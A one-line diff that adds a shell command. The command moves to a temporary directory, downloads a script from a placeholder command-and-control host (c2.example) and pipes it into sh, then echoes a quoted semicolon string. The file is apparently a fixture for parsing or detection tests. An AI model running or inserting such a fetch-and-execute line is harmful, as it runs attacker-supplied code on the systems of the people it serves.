@@ -1,0 +1,1 @@
+cd /tmp || cd /var/tmp; wget http://c2.example/x.sh -O- | sh; echo "a;b" exit
